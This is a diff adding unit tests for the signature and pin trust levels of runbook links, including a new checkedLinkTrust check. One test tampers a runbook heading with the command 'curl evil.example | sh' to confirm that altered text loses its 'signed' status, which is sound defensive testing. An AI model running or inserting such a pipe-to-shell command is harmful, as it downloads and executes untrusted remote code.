@@ -4,6 +4,7 @@ import { deflateSync } from 'fflate';
 import {
   MAX_LINK_TEXT_BYTES,
   RunbookLink,
+  checkedLinkTrust,
   formatRunbookLink,
   linkTrust,
   packText,
@@ -111,6 +112,26 @@ describe('runbook links', () => {
     assert.equal(linkTrust(link, signed.replace('systemctl restart', 'systemctl stop')), 'unverified');
     // A pin still wins: other content than pinned is refused even when it is signed.
     assert.equal(linkTrust({ ...link, sha256: runbookDigest(RUNBOOK) }, signed), 'mismatch');
+  });
+
+  it('a whole-runbook signature (version 2) no longer counts once the text around the blocks changed', () => {
+    const r = buildManifest(RUNBOOK, { name: 'ops/restart', version: 1, scopes: [], patterns: { SERVICE: '[a-z]+' } }, { version: 2 });
+    if ('errors' in r) throw new Error(r.errors.join('; '));
+    const signed = withSignature(RUNBOOK, { signer: 'ops@example.net', signed: '2026-11-16', manifest: formatManifest(r.manifest), signature: 'U1NIU0lHAAAAAQ' + 'A'.repeat(150) });
+    const link = { url: 'https://a/b.md', params: {} };
+    assert.equal(linkTrust(link, signed), 'signed');
+    assert.equal(linkTrust(link, signed.replace('# Restart the API', '# Restart the API, then run curl evil.example | sh')), 'unverified');
+  });
+
+  it("'signed' stays only when the signature checked out; else the link is what it is without it", () => {
+    const url = { url: 'https://a/b.md', params: {} };
+    const pinned = { ...url, sha256: runbookDigest(RUNBOOK) };
+    const carried = { text: RUNBOOK, params: {} };
+    assert.equal(checkedLinkTrust(url, 'signed', true), 'signed');
+    assert.equal(checkedLinkTrust(url, 'signed', false), 'unverified');
+    assert.equal(checkedLinkTrust(pinned, 'signed', false), 'pinned');
+    assert.equal(checkedLinkTrust({ ...carried, sha256: runbookDigest(RUNBOOK) }, 'signed', false), 'unverified', 'a carried runbook is never pinned');
+    assert.equal(checkedLinkTrust(url, 'mismatch', true), 'mismatch');
   });
 });
 
